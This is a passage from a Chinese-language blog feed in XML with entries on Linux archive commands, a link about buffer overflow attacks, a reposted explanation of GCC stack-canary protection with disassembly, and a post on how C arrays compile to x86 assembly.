tar –xZvf file.tar.Z   解压tar.Z
unrar e file.rar 解压rar
unzip file.zip 解压zip
</code></pre><p>总结</p>
<pre><code>*.tar 用 tar –xvf 解压
*.gz 用 gzip -d或者gunzip 解压
*.tar.gz和*.tgz 用 tar –xzf 解压
*.bz2 用 bzip2 -d或者用bunzip2 解压
*.tar.bz2用tar –xjf 解压
*.Z 用 uncompress 解压
*.tar.Z 用tar –xZf 解压
*.rar 用 unrar e解压
*.zip 用 unzip 解压
</code></pre><h2 id="文本编辑指令"><a href="#文本编辑指令" class="headerlink" title="文本编辑指令"></a>文本编辑指令</h2><h2 id="磁盘操作指令"><a href="#磁盘操作指令" class="headerlink" title="磁盘操作指令"></a>磁盘操作指令</h2><h2 id="网络通信指令"><a href="#网络通信指令" class="headerlink" title="网络通信指令"></a>网络通信指令</h2><h2 id="系统管理指令"><a href="#系统管理指令" class="headerlink" title="系统管理指令"></a>系统管理指令</h2><h2 id="系统设置指令"><a href="#系统设置指令" class="headerlink" title="系统设置指令"></a>系统设置指令</h2><h2 id="其他常见指令"><a href="#其他常见指令" class="headerlink" title="其他常见指令"></a>其他常见指令</h2>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h2&gt;&lt;p&gt;本文章记录自己学习Linux路上的点点滴滴。&lt;/p&gt;
&lt;h2 id=&quot;文本操作命令&quot;&gt;&lt;a href=&quot;#文本操作命令&quot; class=&quot;he
    
    </summary>
    
      <category term="工具" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|Linux下缓冲区溢出攻击的原理及对策</title>
    <link href="http://yoursite.com/2018/05/10/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-Linux%E4%B8%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AF%B9%E7%AD%96/"/>
    <id>http://yoursite.com/2018/05/10/深入理解计算机系统-Linux下缓冲区溢出攻击的原理及对策/</id>
    <published>2018-05-09T23:03:40.000Z</published>
    <updated>2018-05-09T15:12:43.328Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.ibm.com/developerworks/cn/linux/l-overflow/index.html" target="_blank" rel="external">Linux下缓冲区溢出攻击的原理及对策</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://www.ibm.com/developerworks/cn/linux/l-overflow/index.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Linux下缓冲区溢出攻击的原理及对策&lt;/a&gt;&lt;/p&gt;

    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|编译器堆栈保护原理</title>
    <link href="http://yoursite.com/2018/05/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E7%BC%96%E8%AF%91%E5%99%A8%E5%A0%86%E6%A0%88%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86/"/>
    <id>http://yoursite.com/2018/05/09/深入理解计算机系统-编译器堆栈保护原理/</id>
    <published>2018-05-09T00:44:38.000Z</published>
    <updated>2018-05-08T17:29:55.187Z</updated>
    
    <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>以堆栈溢出为代表的缓冲区溢出已成为最为普遍的安全漏洞。由此引发的安全问题比比皆是。早在 1988 年，美国康奈尔大学的计算机科学系研究生莫里斯 (Morris) 利用 UNIX fingered 程序的溢出漏洞，写了一段恶意程序并传播到其他机器上，结果造成 6000 台 Internet 上的服务器瘫痪，占当时总数的 10%。各种操作系统上出现的溢出漏洞也数不胜数。为了尽可能避免缓冲区溢出漏洞被攻击者利用，现今的编译器设计者已经开始在编译器层面上对堆栈进行保护。现在已经有了好几种编译器堆栈保护的实现，其中最著名的是 StackGuard 和 Stack-smashing Protection (SSP，又名 ProPolice）。</p>
<h3 id="编译器堆栈保护原理"><a href="#编译器堆栈保护原理" class="headerlink" title="编译器堆栈保护原理"></a>编译器堆栈保护原理</h3><p>我们知道攻击者利用堆栈溢出漏洞时，通常会破坏当前的函数栈。例如，攻击者利用清单 1 中的函数的堆栈溢出漏洞时，典型的情况是攻击者会试图让程序往 name 数组中写超过数组长度的数据，直到函数栈中的返回地址被覆盖，使该函数返回时跳转至攻击者注入的恶意代码或 shellcode 处执行。溢出攻击后，函数栈变成了图 2 所示的情形，与溢出前（图 1）比较可以看出原本堆栈中的 EBP，返回地址已经被溢出字符串覆盖，即函数栈已经被破坏。</p>
<pre><code>int vulFunc() {
    char name[10];
    //…
    return 0;
}
</code></pre><p>溢出前的函数栈<br><img src="/images/堆栈溢出-01.jpg" alt="堆栈溢出"></p>
<p>出后的函数栈<br><img src="/images/堆栈溢出-02.jpg" alt="堆栈溢出"></p>
<p>如果能在运行时检测出这种破坏，就有可能对函数栈进行保护。目前的堆栈保护实现大多使用基于 “Canaries” 的探测技术来完成对这种破坏的检测。</p>
<h3 id="“Canaries”-探测"><a href="#“Canaries”-探测" class="headerlink" title="“Canaries” 探测"></a>“Canaries” 探测</h3><p>要检测对函数栈的破坏，需要修改函数栈的组织，在缓冲区和控制信息（如 EBP 等）间插入一个 canary word。这样，当缓冲区被溢出时，在返回地址被覆盖之前 canary word 会首先被覆盖。通过检查 canary word 的值是否被修改，就可以判断是否发生了溢出攻击。</p>
<p>常见的 canary word：</p>
<ul>
<li><p><strong>Terminator canaries</strong><br>由于绝大多数的溢出漏洞都是由那些不做数组越界检查的 C 字符串处理函数引起的，而这些字符串都是以 NULL 作为终结字符的。选择 NULL, CR, LF 这样的字符作为 canary word 就成了很自然的事情。例如，若 canary word 为 0x000aff0d，为了使溢出不被检测到，攻击者需要在溢出字符串中包含 0x000aff0d 并精确计算 canaries 的位置，使 canaries 看上去没有被改变。然而，0x000aff0d 中的 0x00 会使 strcpy() 结束复制从而防止返回地址被覆盖。而 0x0a 会使 gets() 结束读取。插入的 terminator canaries 给攻击者制造了很大的麻烦。</p>
</li>
<li><p><strong>Random canaries</strong><br>这种 canaries 是<code>随机产生</code>的。并且这样的随机数通常不能被攻击者读取。这种随机数在程序初始化时产生，然后保存在一个未被隐射到虚拟地址空间的内存页中。这样当攻击者试图通过指针访问保存随机数的内存时就会引发 segment fault。但是由于这个随机数的副本最终会作为 canary word 被保存在函数栈中，攻击者仍有可能通过函数栈获得 canary word 的值。</p>
</li>
<li><p><strong>andom XOR canaries</strong><br>这种 canaries 是由一个随机数和函数栈中的所有控制信息、返回地址通过异或运算得到。这样，函数栈中的 canaries 或者任何控制信息、返回地址被修改就都能被检测到了。</p>
</li>
</ul>
<p>目前主要的编译器堆栈保护实现，如 Stack Guard，Stack-smashing Protection(SSP) 均把 Canaries 探测作为主要的保护技术，但是 Canaries 的产生方式各有不同。下面以 GCC 为例，简要介绍堆栈保护技术在 GCC 中的应用。</p>
<h3 id="GCC-中的堆栈保护实现"><a href="#GCC-中的堆栈保护实现" class="headerlink" title="GCC 中的堆栈保护实现"></a>GCC 中的堆栈保护实现</h3><p>GCC 4.1 中三个与堆栈保护有关的编译选项</p>
<ul>
<li><p><code>-fstack-protector</code>：启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码。</p>
</li>
<li><p><code>-fstack-protector-all</code>：启用堆栈保护，为所有函数插入保护代码。</p>
</li>
<li><p><code>-fno-stack-protector</code>：禁用堆栈保护。</p>
</li>
</ul>
<h4 id="GCC-中的-Canaries-探测"><a href="#GCC-中的-Canaries-探测" class="headerlink" title="GCC 中的 Canaries 探测"></a>GCC 中的 Canaries 探测</h4><p>下面通过一个例子分析 GCC 堆栈保护所生成的代码。分别使用 <code>-fstack-protector</code> 选项和 <code>-fno-stack-protector</code> 编译清单2中的代码得到可执行文件 demo_sp (-fstack-protector)，demo_nosp (-fno-stack-protector)。</p>
<pre><code>int main() {
    int i;
    char buffer[64];
    i = 1;
    buffer[0] = &apos;a&apos;;
    return 0;
}
</code></pre><p>然后用 gdb 分别反汇编 demo_sp，deno_nosp。</p>
<p>demo_nosp 的汇编代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">(gdb) disas main</div><div class="line">Dump of assembler code for function main:</div><div class="line">0x08048344 &lt;main+0&gt;:    lea    0x4(%esp),%ecx</div><div class="line">0x08048348 &lt;main+4&gt;:    and    $0xfffffff0,%esp</div><div class="line">0x0804834b &lt;main+7&gt;:    pushl  0xfffffffc(%ecx)</div><div class="line">0x0804834e &lt;main+10&gt;:   push   %ebp</div><div class="line">0x0804834f &lt;main+11&gt;:   mov    %esp,%ebp</div><div class="line">0x08048351 &lt;main+13&gt;:   push   %ecx</div><div class="line">0x08048352 &lt;main+14&gt;:   sub    $0x50,%esp</div><div class="line">0x08048355 &lt;main+17&gt;:   movl   $0x1,0xfffffff8(%ebp)</div><div class="line">0x0804835c &lt;main+24&gt;:   movb   $0x61,0xffffffb8(%ebp)</div><div class="line">0x08048360 &lt;main+28&gt;:   mov    $0x0,%eax</div><div class="line">0x08048365 &lt;main+33&gt;:   add    $0x50,%esp</div><div class="line">0x08048368 &lt;main+36&gt;:   pop    %ecx</div><div class="line">0x08048369 &lt;main+37&gt;:   pop    %ebp</div><div class="line">0x0804836a &lt;main+38&gt;:   lea    0xfffffffc(%ecx),%esp</div><div class="line">0x0804836d &lt;main+41&gt;:   ret    </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure>
<p>demo_sp 的汇编代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">(gdb) disas main</div><div class="line">Dump of assembler code for function main:</div><div class="line">0x08048394 &lt;main+0&gt;:    lea    0x4(%esp),%ecx</div><div class="line">0x08048398 &lt;main+4&gt;:    and    $0xfffffff0,%esp</div><div class="line">0x0804839b &lt;main+7&gt;:    pushl  0xfffffffc(%ecx)</div><div class="line">0x0804839e &lt;main+10&gt;:   push   %ebp</div><div class="line">0x0804839f &lt;main+11&gt;:   mov    %esp,%ebp</div><div class="line">0x080483a1 &lt;main+13&gt;:   push   %ecx</div><div class="line">0x080483a2 &lt;main+14&gt;:   sub    $0x54,%esp</div><div class="line">0x080483a5 &lt;main+17&gt;:   mov    %gs:0x14,%eax</div><div class="line">0x080483ab &lt;main+23&gt;:   mov    %eax,0xfffffff8(%ebp)</div><div class="line">0x080483ae &lt;main+26&gt;:   xor    %eax,%eax</div><div class="line">0x080483b0 &lt;main+28&gt;:   movl   $0x1,0xffffffb4(%ebp)</div><div class="line">0x080483b7 &lt;main+35&gt;:   movb   $0x61,0xffffffb8(%ebp)</div><div class="line">0x080483bb &lt;main+39&gt;:   mov    $0x0,%eax</div><div class="line">0x080483c0 &lt;main+44&gt;:   mov    0xfffffff8(%ebp),%edx</div><div class="line">0x080483c3 &lt;main+47&gt;:   xor    %gs:0x14,%edx</div><div class="line">0x080483ca &lt;main+54&gt;:   je     0x80483d1 &lt;main+61&gt;</div><div class="line">0x080483cc &lt;main+56&gt;:   call   0x80482fc &lt;__stack_chk_fail@plt&gt;</div><div class="line">0x080483d1 &lt;main+61&gt;:   add    $0x54,%esp</div><div class="line">0x080483d4 &lt;main+64&gt;:   pop    %ecx</div><div class="line">0x080483d5 &lt;main+65&gt;:   pop    %ebp</div><div class="line">0x080483d6 &lt;main+66&gt;:   lea    0xfffffffc(%ecx),%esp</div><div class="line">0x080483d9 &lt;main+69&gt;:   ret    </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
<p>demo_nosp 的汇编代码中地址为 0x08048344 的指令将 esp+4 存入 ecx，此时 esp 指向的内存中保存的是返回地址。地址为 0x0804834b 的指令将 ecx-4 所指向的内存压栈，由于之前已将 esp+4 存入 ecx，所以该指令执行后原先 esp 指向的内容将被压栈，即返回地址被再次压栈。0x08048348 处的 and 指令使堆顶以 16 字节对齐。从 0x0804834e 到 0x08048352 的指令是则保存了旧的 EBP，并为函数设置了新的栈框。当函数完成时，0x08048360 处的 mov 指令将返回值放入 EAX，然后恢复原来的 EBP，ESP。不难看出，demo_nosp 的汇编代码中，没有任何对堆栈进行检查和保护的代码。</p>
<p>将用 <code>-fstack-protector</code> 选项编译的 demo_sp 与没有堆栈保护的 demo_nosp 的汇编代码相比较，两者最显著的区别就是在函数真正执行前多了 3 条语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0x080483a5 &lt;main+17&gt;:   mov    %gs:0x14,%eax</div><div class="line">0x080483ab &lt;main+23&gt;:   mov    %eax,0xfffffff8(%ebp)</div><div class="line">0x080483ae &lt;main+26&gt;:   xor    %eax,%eax</div></pre></td></tr></table></figure>
<p>在函数返回前又多了 4 条语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0x080483c0 &lt;main+44&gt;:   mov    0xfffffff8(%ebp),%edx</div><div class="line">0x080483c3 &lt;main+47&gt;:   xor    %gs:0x14,%edx</div><div class="line">0x080483ca &lt;main+54&gt;:   je     0x80483d1 &lt;main+61&gt;</div><div class="line">0x080483cc &lt;main+56&gt;:   call   0x80482fc &lt;__stack_chk_fail@plt&gt;</div></pre></td></tr></table></figure></p>
<p>这多出来的语句便是 SSP 堆栈保护的关键所在，通过这几句代码就在函数栈框中插入了一个 Canary，并实现了通过这个 canary 来检测函数栈是否被破坏。</p>
<p><code>%gs:0x14</code> 中保存是一个随机数，0x080483a5 到 0x080483ae 处的 3 条语句将这个随机数放入了栈中 [EBP-8] 的位置。函数返回前 0x080483c0 到 0x080483cc 处的 4 条语句则将栈中 [EBP-8] 处保存的 Canary 取出并与 %gs:0x14 中的随机数作比较。若不等，则说明函数执行过程中发生了溢出，函数栈框已经被破坏，此时程序会跳转到 <code>__stack_chk_fail</code> 输出错误消息然后中止运行。若相等，则函数正常返回。</p>
<p>文章来源：<a href="https://www.ibm.com/developerworks/cn/linux/l-cn-gccstack/index.html" target="_blank" rel="external">IBM-GCC 中的编译器堆栈保护技术</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h3&gt;&lt;p&gt;以堆栈溢出为代表的缓冲区溢出已成为最为普遍的安全漏洞。由此引发的安全问题比比皆是。早在 1988 年，美国康奈尔大学的计算机科学系研究生莫里
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|汇编的世界-6</title>
    <link href="http://yoursite.com/2018/05/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-6/"/>
    <id>http://yoursite.com/2018/05/09/深入理解计算机系统-汇编的世界-6/</id>
    <published>2018-05-08T16:39:30.000Z</published>
    <updated>2018-05-08T15:18:05.606Z</updated>
    
    <content type="html"><![CDATA[<p>现在我们一起去探讨C语言中数组、结构体的实现，相比之下，数组与流程控制和过程的实现难度差不多，尤其是动态数组可能相对来说困难一点。</p>
<h3 id="数组简介"><a href="#数组简介" class="headerlink" title="数组简介"></a>数组简介</h3><p><code>数组</code>，它就是一个相同数据类型的数据集合。数组存储在一系列逻辑上连续的内存块当中，之所以说是逻辑上连续，是因为整个内存或者说存储器本身就是逻辑上连续的一个大内存数组。</p>
<p>C语言中数组的定义：<code>int arr[length]</code>。这当中<code>int</code>表示数据类型，<code>arr</code>是变量名称，<code>length</code>是数组长度。这样的声明会做两件事，首先是在内存当中开辟一个长为<code>lentth*sizeof(int)</code>的内存空间（其中sizeof(int)是指int数据类型的字节长度），然后将这块内存空间的起始地址赋给变量<code>arr</code>。当我们使用<code>arr[index]</code>去读取数组元素的时候，我们会去读<code>arr+index*sizeof(int)</code>的内存位置，这一点并不难理解。如果你足够细心，你会发现<strong>变量名 arr 在这里就是一个指向数组第一个元素的地址，也就是 <code>arr = &amp;arr[0]</code></strong>，这也是数组的一大特性，本文也会着重探讨这一特性。</p>
<h3 id="指针与数组"><a href="#指针与数组" class="headerlink" title="指针与数组"></a>指针与数组</h3><p>关于c语言，需要注意的是：</p>
<ul>
<li><p>C语言中只有一维数组，数组大小在编译期就要明确。同时，数组的元素可以是任意类型的对象，可以是整数、结构体…任意的对象自然也还包括数组，所以就能根据这个“仿真”出多维数组。</p>
</li>
<li><p>对于数组，我们只能做两件事：</p>
<ul>
<li><p>确定大小</p>
</li>
<li><p>获得指向数组下标为0的指针</p>
</li>
</ul>
</li>
</ul>
<p>所以，我们知道我们对数组的操作，都是在通过操作指向数组下标为0的指针进行的。来看个例子：</p>
<pre><code>int a[3];

int * p = a;

print(&quot;%d&quot;,*p);
</code></pre><p>上述例子会打印出 a[0] 的值，所以我们得知 数组名就是指向数组下标为0的元素的指针。在进一步，对于p+1，我们得到了数组下标为1的指针。总的来说，*(a+i)就是数组中下标为i的元素的引用。</p>
<h3 id="定长和变长数组"><a href="#定长和变长数组" class="headerlink" title="定长和变长数组"></a>定长和变长数组</h3><p>要理解定长和变长数组，我们必须搞清楚一个概念，就是说这个“定”和“变”是针对什么来说的。在这里我们说，这两个字是针对编译器来说的，也就是说，如果在编译时数组的长度确定，我们就称为定长数组，反之则称为变长数组。</p>
<p>现在我们一起分析一个有关数组的C程序，我们先来一个简单的，也就是一个定长数组，我们看下在汇编级别是如何操作定长数组的。需要一提的是，由于数组的长度固定，所以有的时候编译器会根据实际情况作出一些优化，以下是一个简单的小程序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">int main()&#123;</div><div class="line"></div><div class="line">    int a[5];</div><div class="line"></div><div class="line">    int i,sum;</div><div class="line"></div><div class="line">    for(i = 0 ; i &lt; 5; i++)&#123;</div><div class="line"></div><div class="line">        a[i] = i * 3;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    for(i = 0 ; i &lt; 5; i++)&#123;</div><div class="line"></div><div class="line">        sum += a[i];</div><div class="line"></div><div class="line">    &#125; </div><div class="line"></div><div class="line">    return sum;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>同样通过-S得到下来汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">main:</div><div class="line"></div><div class="line">    pushl    %ebp</div><div class="line"></div><div class="line">    movl    %esp, %ebp//到此准备好栈帧</div><div class="line"></div><div class="line">    subl    $32, %esp//分配32个字节的空间</div><div class="line"></div><div class="line">    leal    -20(%ebp), %edx//将帧指针减去20赋给%edx寄存器？为什么？你能猜到吗？</div><div class="line"></div><div class="line">    movl    $0, %eax//将%eax设置为0，这里的%eax寄存器是重点</div><div class="line"></div><div class="line">.L2:</div><div class="line"></div><div class="line">    movl    %eax, (%edx)//将0放入帧指针减去20的位置？</div><div class="line"></div><div class="line">    addl    $3, %eax//第一次循环时，%eax为3，对于i来说，%eax=(i+1)*3。</div><div class="line"></div><div class="line">    addl    $4, %edx//将%edx加上4，第一次循环%edx指向帧指针-16的位置</div><div class="line"></div><div class="line">    cmpl    $15, %eax//比较%eax和15？</div><div class="line"></div><div class="line">    jne    .L2//如果不相等的话就回到L2</div><div class="line"></div><div class="line">    movl    -20(%ebp), %eax//下面这五句指令已经出卖了leal指令，很明显从-20到-4，就是数组五个元素存放的地方。下面的就不解释了，直接依次相加然后返回结果。</div><div class="line"></div><div class="line">    addl    -16(%ebp), %eax</div><div class="line"></div><div class="line">    addl    -12(%ebp), %eax</div><div class="line"></div><div class="line">    addl    -8(%ebp), %eax</div><div class="line"></div><div class="line">    addl    -4(%ebp), %eax</div><div class="line"></div><div class="line">    leave</div><div class="line"></div><div class="line">    ret</div></pre></td></tr></table></figure>
<p>对于汇编指令就不多说了，我们主要来看下跟数组相关的地方。上面其实并没有完全解释清楚数组的赋值操作那一部分，但是后面求和的部分却已经十分清楚了，现在贴心的我就帮各位串联一下赋值的部分。为了更加清晰，直接上图。我们看下循环过程中是怎么计算的。</p>
<p><img src="/images/汇编-30.png" alt="数组"></p>
<p>看了这个图相信各位更加清楚程序的意图了，开始将<code>%ebp</code>减去20是为了依次给数组赋值。这里编译器用了非常变态的优化技巧。那就是编译器发现了<code>a[i+1] = a[i] + 3</code>的规律，因此使用加法（将<code>%eax</code>不断加3）代替了<code>i*3</code>的乘法操作，另外也使用了加法（即地址不断加4，而不使用起始地址加上索引乘以4的方式）代替了数组元素地址计算过程中的乘法操作。而循环条件当中的<code>i&lt;5</code>，也变成了<code>3*i&lt;15</code>，而<code>3*i</code>又等于<code>a[i]</code>，因此当整个数组当中循环的索引<code>i</code>，满足<code>a[i+1]=15</code>（注意，在循环内的时候，<code>%eax</code>一直储存着<code>a[i+1]</code>的值，除了刚开始的0）的时候。什么时候结束循环，也就是<code>coml和jne指令</code>所做的事。再一次惊叹编译器的神奇。</p>
<p>搞清楚了上面定长数组的实现，我们会发现，定长数组可以做很多的优化，想象一下，如果上面的数组长度是不定的，编译器还能算出15这个数值吗。接下来我们就来看一个和上面的代码几乎一模一样的程序，只不过这里将换成变长数组。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">int sum(int n)&#123;</div><div class="line"></div><div class="line">    int a[n];</div><div class="line"></div><div class="line">    int i,sum;</div><div class="line"></div><div class="line">    for(i = 0 ; i &lt; n; i++)&#123;</div><div class="line"></div><div class="line">        a[i] = i * 3;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    for(i = 0 ; i &lt; n; i++)&#123;</div><div class="line"></div><div class="line">        sum += a[i];</div><div class="line"></div><div class="line">    &#125; </div><div class="line"></div><div class="line">    return sum;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以看到，我们改了一下函数名称，并给函数加了个参数n并将a变为变长数组，其它没做任何改动。下面我们来看下-S和-O1下的汇编代码，看看与定长数组的差距在哪里。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">.file    &quot;arr.c&quot;</div><div class="line"></div><div class="line">    .text</div><div class="line"></div><div class="line">.globl sum</div><div class="line"></div><div class="line">    .type    sum, @function</div><div class="line"></div><div class="line">sum:</div><div class="line"></div><div class="line">    pushl    %ebp</div><div class="line"></div><div class="line">    movl    %esp, %ebp</div><div class="line"></div><div class="line">    pushl    %esi</div><div class="line"></div><div class="line">    pushl    %ebx</div><div class="line"></div><div class="line">    subl    $16, %esp</div><div class="line"></div><div class="line">    movl    8(%ebp), %ebx</div><div class="line"></div><div class="line">    movl    %gs:20, %edx</div><div class="line"></div><div class="line">    movl    %edx, -12(%ebp)</div><div class="line"></div><div class="line">    xorl    %edx, %edx</div><div class="line"></div><div class="line">    leal    30(,%ebx,4), %edx</div><div class="line"></div><div class="line">    andl    $-16, %edx</div><div class="line"></div><div class="line">    subl    %edx, %esp</div><div class="line"></div><div class="line">    leal    15(%esp), %esi</div><div class="line"></div><div class="line">    andl    $-16, %esi</div><div class="line"></div><div class="line">    testl    %ebx, %ebx</div><div class="line"></div><div class="line">    jle    .L2</div><div class="line"></div><div class="line">    movl    $0, %ecx</div><div class="line"></div><div class="line">    movl    $0, %edx</div><div class="line"></div><div class="line">.L3:</div><div class="line"></div><div class="line">    movl    %ecx, (%esi,%edx,4)</div><div class="line"></div><div class="line">    addl    $1, %edx</div><div class="line"></div><div class="line">    addl    $3, %ecx</div><div class="line"></div><div class="line">    cmpl    %ebx, %edx</div><div class="line"></div><div class="line">    jne    .L3</div><div class="line"></div><div class="line">    movl    $0, %edx</div><div class="line"></div><div class="line">.L4:</div><div class="line"></div><div class="line">    addl    (%esi,%edx,4), %eax</div><div class="line"></div><div class="line">    addl    $1, %edx</div><div class="line"></div><div class="line">    cmpl    %ebx, %edx</div><div class="line"></div><div class="line">    jne    .L4</div><div class="line"></div><div class="line">.L2:</div><div class="line"></div><div class="line">    movl    